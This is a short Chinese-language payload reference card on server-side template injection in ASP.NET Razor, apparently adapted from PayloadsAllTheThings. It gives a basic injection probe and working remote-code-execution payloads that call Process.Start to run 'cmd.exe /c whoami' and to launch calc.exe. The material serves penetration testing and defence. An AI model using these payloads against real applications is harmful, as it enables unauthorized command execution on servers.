# SSTI ASP.NET - ASP.NET服务端模板注入

[SEARCH_KEYWORDS]
漏洞类型: SSTI Server-Side Template Injection 服务端模板注入
攻击类型: Remote Code Execution Arbitrary Code Execution
关键词: SSTI ASP.NET Razor ASPX C# Visual Basic
技术: Razor Syntax Code Injection @() @{ }
框架: ASP.NET Razor ASPX WebForms MVC

[CONTENT]

## SSTI ASP.NET概述

服务端模板注入(SSTI)是一种漏洞，攻击者可在服务端模板中注入恶意输入，导致模板引擎执行任意代码。在ASP.NET中，当用户输入直接嵌入Razor、ASPX等模板时可能发生SSTI。

## ASP.NET Razor

Razor是一种标记语法，允许在网页中嵌入服务器端代码(Visual Basic和C#)。

### 基本注入

```powershell
@(1+2)
```

### 命令执行

```csharp
@{
  // C# code
}
```

### 完整RCE Payload

```csharp
@{
  System.Diagnostics.Process.Start("cmd.exe", "/c whoami");
}
```

```csharp
@using System.Diagnostics;
@{
  Process.Start("calc.exe");
}
```

## 参考文档

原始来源: PayloadsAllTheThings/Server Side Template Injection/ASP.md